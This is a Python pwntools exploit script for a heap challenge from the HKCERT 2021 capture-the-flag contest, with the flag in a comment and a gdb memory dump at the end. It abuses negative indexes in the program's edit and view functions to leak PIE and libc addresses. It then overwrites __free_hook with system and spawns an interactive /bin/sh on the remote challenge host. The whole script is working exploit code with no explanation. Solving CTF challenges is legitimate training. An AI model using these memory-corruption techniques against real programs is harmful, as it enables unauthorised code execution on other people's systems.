# hkcert21{pretend_to_be_A_h34p_chalI}
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("chalp.hkcert21.pwnable.hk", 38230)

def sa(s, d):
    target.sendafter(s, str(d))

def sla(s, d):
    sa(s, str(d)+"\n")

def eat_cookie():
    sla(">", 1)

def create(size=0x13, cookie="whoamiT"):
    sla(">", 2)
    sla("?", size)
    sa(":", cookie)
    print ".",

def edit(idx, msg):
    sla(">", 3)
    sla(":", idx)
    sa(":", msg)

def view(idx):
    sla(">", 4)
    sla(": ", idx)
    return target.recvline().strip()

for i in range(22):
    create()

pie_leak = u64(view(-11).ljust(8, '\x00'))
print
log.info("PIE Leak: " + hex(pie_leak))

edit(-11, '\x40')
libc_base = u64(view(-11).ljust(8, '\x00')) - libc.sym['_IO_2_1_stderr_']
log.info("LIBC Base: " + hex(libc_base))

edit(-11, p64(libc_base + libc.sym['_IO_2_1_stderr_']) + p64(0)*3 + p64(libc_base + libc.sym['__free_hook'] - 8)*32)
edit(0, "/bin/sh\x00" + p64(libc_base + libc.sym['system']))

#gdb.attach(target, 'b atoi')
eat_cookie()

target.interactive()
'''
0x555555558000: 0x0000000000000000  0x0000555555558008
0x555555558010: 0x0000000000000000  0x0000000000000000
0x555555558020 <stdout@@GLIBC_2.2.5>:   0x00007ffff7f9b6a0  0x0000000000000000
0x555555558030 <stdin@@GLIBC_2.2.5>:    0x00007ffff7f9a980  0x0000000000000000
0x555555558040 <stderr@@GLIBC_2.2.5>:   0x00007ffff7f9b5c0  0x0000000000000000
0x555555558050: 0x0000000000000000  0x0000000000000000
0x555555558060 <msg>:   0x0000555555559480  0x00005555555594e0
0x555555558070 <msg+16>:    0x0000555555559520  0x0000555555559540
'''